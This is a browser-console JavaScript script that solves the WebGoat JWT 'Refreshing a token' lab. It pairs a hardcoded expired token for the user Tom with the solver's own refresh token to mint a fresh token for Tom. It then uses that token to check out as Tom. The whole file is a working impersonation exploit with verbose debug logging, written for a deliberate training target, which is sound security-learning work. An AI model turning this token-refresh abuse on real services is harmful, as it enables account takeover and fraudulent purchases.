// ═══════════════════════════════════════════════════════════
// JWT REFRESH - ULTRA DEBUG VERSION
// This version shows EVERY SINGLE STEP with maximum visibility
// ═══════════════════════════════════════════════════════════

// ═══════════════════════════════════════════════════════════
// SECTION 1: SETUP
// ═══════════════════════════════════════════════════════════

(function() {
    console.log('%c════════════════════════════════════════', 'color: blue; font-weight: bold; font-size: 14px');
    console.log('%c[SECTION 1] SETUP STARTING...', 'color: blue; font-weight: bold; font-size: 14px');
    console.log('%c════════════════════════════════════════', 'color: blue; font-weight: bold; font-size: 14px');
    
    window.TOMS_EXPIRED = 'eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q';
    
    console.log('%c✓ Tom\'s token saved to window.TOMS_EXPIRED', 'color: green; font-weight: bold');
    console.log('Token length:', window.TOMS_EXPIRED.length);
    console.log('First 50 chars:', window.TOMS_EXPIRED.substring(0, 50) + '...');
    
    try {
        const parts = window.TOMS_EXPIRED.split('.');
        console.log('Token has', parts.length, 'parts');
        const decoded = JSON.parse(atob(parts[1]));
        console.log('Decoded payload:', decoded);
    } catch (e) {
        console.log('Decode error:', e);
    }
    
    console.log('\n%c✅ SECTION 1 COMPLETE!', 'color: white; background: green; font-size: 16px; font-weight: bold; padding: 8px');
    console.log('\n%c⚠️ NOW DO THIS:', 'color: orange; font-size: 14px; font-weight: bold');
    console.log('%cwindow.myRefreshToken = "YOUR_ACTUAL_TOKEN_HERE";', 'color: blue; font-size: 12px; background: #eee; padding: 3px');
    console.log('\n%cThen run SECTION 2', 'color: orange; font-weight: bold');
})();

// ═══════════════════════════════════════════════════════════
// SECTION 2: GET TOM'S NEW TOKEN (ULTRA DEBUG)
// ═══════════════════════════════════════════════════════════

(function() {
    console.log('\n%c════════════════════════════════════════', 'color: blue; font-weight: bold; font-size: 14px');
    console.log('%c[SECTION 2] ATTACK STARTING...', 'color: blue; font-weight: bold; font-size: 14px');
    console.log('%c════════════════════════════════════════', 'color: blue; font-weight: bold; font-size: 14px');
    
    // IMMEDIATE output to show execution started
    console.log('%c🔍 Section 2 is executing RIGHT NOW!', 'color: purple; font-weight: bold; font-size: 13px');
    console.log('Timestamp:', new Date().toISOString());
    
    // Check 1: Tom's token
    console.log('\n%c[CHECK 1/2] Checking Tom\'s token...', 'color: cyan; font-weight: bold');
    console.log('typeof window.TOMS_EXPIRED:', typeof window.TOMS_EXPIRED);
    console.log('Is undefined?', typeof window.TOMS_EXPIRED === 'undefined');
    
    if (typeof window.TOMS_EXPIRED === 'undefined') {
        console.log('%c❌ FAIL: Tom\'s token not found!', 'color: white; background: red; font-weight: bold; padding: 5px');
        console.log('You need to run SECTION 1 first!');
        return;
    }
    console.log('%c✓ PASS: Tom\'s token exists', 'color: green; font-weight: bold');
    console.log('Token preview:', window.TOMS_EXPIRED.substring(0, 40) + '...');
    
    // Check 2: Your refresh token
    console.log('\n%c[CHECK 2/2] Checking your refresh token...', 'color: cyan; font-weight: bold');
    console.log('typeof window.myRefreshToken:', typeof window.myRefreshToken);
    console.log('Is undefined?', typeof window.myRefreshToken === 'undefined');
    console.log('Is empty?', !window.myRefreshToken);
    
    if (typeof window.myRefreshToken === 'undefined' || !window.myRefreshToken) {
        console.log('%c❌ FAIL: Your refresh token not set!', 'color: white; background: red; font-weight: bold; padding: 5px');
        console.log('\n%c⚠️ YOU MUST SET IT FIRST:', 'color: orange; font-size: 14px; font-weight: bold');
        console.log('%cwindow.myRefreshToken = "YOUR_ACTUAL_TOKEN_HERE";', 'color: blue; font-size: 12px; background: #eee; padding: 3px');
        console.log('\nThen re-run this section.');
        console.log('\n%c💡 TIP: Get your refresh token from:', 'color: blue; font-weight: bold');
        console.log('  • Network tab (F12) when clicking buttons on the lesson page');
        console.log('  • Look for requests to /JWT/refresh/login');
        console.log('  • Check localStorage: localStorage.getItem("refresh_token")');
        return;
    }
    console.log('%c✓ PASS: Your refresh token exists', 'color: green; font-weight: bold');
    console.log('Token length:', window.myRefreshToken.length);
    console.log('Token preview:', window.myRefreshToken.substring(0, 40) + '...');
    
    // Prepare request
    console.log('\n%c[PREPARING REQUEST]', 'color: cyan; font-weight: bold');
    const url = '/WebGoat/JWT/refresh/newToken';
    const fullUrl = window.location.origin + url;
    console.log('URL:', fullUrl);
    console.log('Method: POST');
    console.log('Headers:', {
        'Authorization': 'Bearer ' + window.TOMS_EXPIRED.substring(0, 30) + '...',
        'Content-Type': 'application/json'
    });
    console.log('Body:', JSON.stringify({ refresh_token: window.myRefreshToken.substring(0, 30) + '...' }));
    
    // Make request
    console.log('\n%c[SENDING REQUEST]', 'color: cyan; font-weight: bold; font-size: 13px');
    console.log('⏳ Waiting for response...');
    
    fetch(url, {
        method: 'POST',
        headers: {
            'Authorization': 'Bearer ' + window.TOMS_EXPIRED,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ 
            refresh_token: window.myRefreshToken 
        })
    })
    .then(response => {
        console.log('\n%c[RESPONSE RECEIVED]', 'color: cyan; font-weight: bold; font-size: 13px');
        console.log('Status:', response.status, response.statusText);
        console.log('OK:', response.ok);
        console.log('Headers:', [...response.headers].map(([k,v]) => k + ': ' + v).join('\n'));
        
        if (!response.ok) {
            console.log('%c⚠️ Non-OK response, reading body...', 'color: orange; font-weight: bold');
            return response.text().then(text => {
                console.log('%c❌ REQUEST FAILED!', 'color: white; background: red; font-weight: bold; padding: 5px');
                console.log('Status:', response.status);
                console.log('Body:', text);
                throw new Error('HTTP ' + response.status);
            });
        }
        
        console.log('%c✓ Response OK, parsing JSON...', 'color: green; font-weight: bold');
        return response.json();
    })
    .then(data => {
        console.log('\n%c[PARSING RESPONSE]', 'color: cyan; font-weight: bold; font-size: 13px');
        console.log('Response type:', typeof data);
        console.log('Response keys:', Object.keys(data));
        console.log('Full response:', data);
        
        if (!data.access_token) {
            console.log('%c⚠️ No access_token in response!', 'color: orange; font-weight: bold');
            console.log('Response structure:', JSON.stringify(data, null, 2));
            return;
        }
        
        console.log('%c✓ Found access_token!', 'color: green; font-weight: bold');
        console.log('Token length:', data.access_token.length);
        console.log('Token preview:', data.access_token.substring(0, 50) + '...');
        
        // Save token
        console.log('\n%c[SAVING TOKEN]', 'color: cyan; font-weight: bold');
        window.tomsNewToken = data.access_token;
        console.log('✓ Saved to window.tomsNewToken');
        
        // Decode and verify
        console.log('\n%c[VERIFYING TOKEN]', 'color: cyan; font-weight: bold');
        try {
            const parts = data.access_token.split('.');
            console.log('Token has', parts.length, 'parts');
            const decoded = JSON.parse(atob(parts[1]));
            console.log('Decoded payload:', decoded);
            console.log('User field:', decoded.user);
            console.log('Admin field:', decoded.admin);
            
            if (decoded.user === 'Tom') {
                console.log('\n%c╔════════════════════════════════════╗', 'color: green; font-weight: bold; font-size: 16px');
                console.log('%c║   ✅ SUCCESS! GOT TOM\'S TOKEN!   ║', 'color: white; background: green; font-weight: bold; font-size: 16px; padding: 5px');
                console.log('%c╚════════════════════════════════════╝', 'color: green; font-weight: bold; font-size: 16px');
                console.log('\n%c✅ SECTION 2 COMPLETE!', 'color: white; background: green; font-size: 16px; font-weight: bold; padding: 8px');
                console.log('\n%c🚀 NOW RUN SECTION 3 TO CHECKOUT!', 'color: orange; font-size: 14px; font-weight: bold');
            } else {
                console.log('\n%c⚠️ WARNING: Token user is not Tom!', 'color: orange; font-weight: bold; font-size: 14px');
                console.log('Expected: Tom');
                console.log('Got:', decoded.user);
                console.log('The attack may not have worked.');
            }
        } catch (e) {
            console.log('Decode error:', e);
            console.log('Error details:', e.stack);
        }
    })
    .catch(error => {
        console.log('\n%c❌ ERROR OCCURRED!', 'color: white; background: red; font-weight: bold; font-size: 16px; padding: 5px');
        console.log('Error type:', error.constructor.name);
        console.log('Error message:', error.message);
        console.log('Error stack:', error.stack);
        
        console.log('\n%c📋 TROUBLESHOOTING:', 'color: blue; font-weight: bold; font-size: 14px');
        console.log('1. Open Network tab (F12) and look for the /JWT/refresh/newToken request');
        console.log('2. Check the request headers and body');
        console.log('3. Check the response status and body');
        console.log('4. Make sure you\'re on the "Refreshing a token" lesson page');
        console.log('5. Try getting a fresh refresh token');
        console.log('6. Verify window.myRefreshToken is correct');
    });
    
    console.log('\n%c⏳ Request sent, waiting for response...', 'color: blue; font-style: italic');
})();

// ═══════════════════════════════════════════════════════════
// SECTION 3: CHECKOUT AS TOM
// ═══════════════════════════════════════════════════════════

(function() {
    console.log('\n%c════════════════════════════════════════', 'color: blue; font-weight: bold; font-size: 14px');
    console.log('%c[SECTION 3] CHECKOUT STARTING...', 'color: blue; font-weight: bold; font-size: 14px');
    console.log('%c════════════════════════════════════════', 'color: blue; font-weight: bold; font-size: 14px');
    
    console.log('%c🔍 Section 3 is executing RIGHT NOW!', 'color: purple; font-weight: bold; font-size: 13px');
    console.log('Timestamp:', new Date().toISOString());
    
    // Check if token exists
    console.log('\n%c[CHECK] Checking if Tom\'s new token exists...', 'color: cyan; font-weight: bold');
    console.log('typeof window.tomsNewToken:', typeof window.tomsNewToken);
    
    if (typeof window.tomsNewToken === 'undefined' || !window.tomsNewToken) {
        console.log('%c❌ FAIL: Tom\'s new token not found!', 'color: white; background: red; font-weight: bold; padding: 5px');
        console.log('\n%c⚠️ You need to run SECTION 2 first!', 'color: orange; font-weight: bold');
        console.log('Make sure Section 2 completed successfully.');
        return;
    }
    console.log('%c✓ PASS: Tom\'s new token exists', 'color: green; font-weight: bold');
    console.log('Token preview:', window.tomsNewToken.substring(0, 40) + '...');
    
    // Prepare checkout
    console.log('\n%c[PREPARING CHECKOUT]', 'color: cyan; font-weight: bold');
    const url = '/WebGoat/JWT/refresh/checkout';
    const fullUrl = window.location.origin + url;
    console.log('URL:', fullUrl);
    console.log('Method: POST');
    console.log('Headers:', {
        'Authorization': 'Bearer ' + window.tomsNewToken.substring(0, 30) + '...',
        'Content-Type': 'application/json'
    });
    
    console.log('\n%c[SENDING CHECKOUT REQUEST]', 'color: cyan; font-weight: bold; font-size: 13px');
    console.log('⏳ Waiting for response...');
    
    fetch(url, {
        method: 'POST',
        headers: {
            'Authorization': 'Bearer ' + window.tomsNewToken,
            'Content-Type': 'application/json'
        }
    })
    .then(response => {
        console.log('\n%c[CHECKOUT RESPONSE RECEIVED]', 'color: cyan; font-weight: bold; font-size: 13px');
        console.log('Status:', response.status, response.statusText);
        console.log('OK:', response.ok);
        
        return response.json().then(data => ({ status: response.status, ok: response.ok, data }));
    })
    .then(result => {
        console.log('\n%c[CHECKOUT RESULT]', 'color: cyan; font-weight: bold; font-size: 13px');
        console.log('Response data:', result.data);
        
        if (result.ok && result.data.lessonCompleted === true) {
            console.log('\n%c╔════════════════════════════════════════════════╗', 'color: green; font-weight: bold; font-size: 16px');
            console.log('%c║  🎉 CHALLENGE COMPLETE! TOM PAID FOR BOOKS!  ║', 'color: white; background: green; font-weight: bold; font-size: 16px; padding: 5px');
            console.log('%c╚════════════════════════════════════════════════╝', 'color: green; font-weight: bold; font-size: 16px');
            console.log('\n%c✅ SECTION 3 COMPLETE!', 'color: white; background: green; font-size: 16px; font-weight: bold; padding: 8px');
            console.log('\n%c🏆 JWT REFRESH TOKEN ATTACK SUCCESSFUL!', 'color: gold; font-size: 18px; font-weight: bold');
        } else {
            console.log('\n%c⚠️ Checkout response:', 'color: orange; font-weight: bold');
            console.log(result.data);
        }
    })
    .catch(error => {
        console.log('\n%c❌ CHECKOUT ERROR!', 'color: white; background: red; font-weight: bold; font-size: 16px; padding: 5px');
        console.log('Error:', error.message);
        console.log('Full error:', error);
    });
    
    console.log('\n%c⏳ Checkout sent, waiting for response...', 'color: blue; font-style: italic');
})();
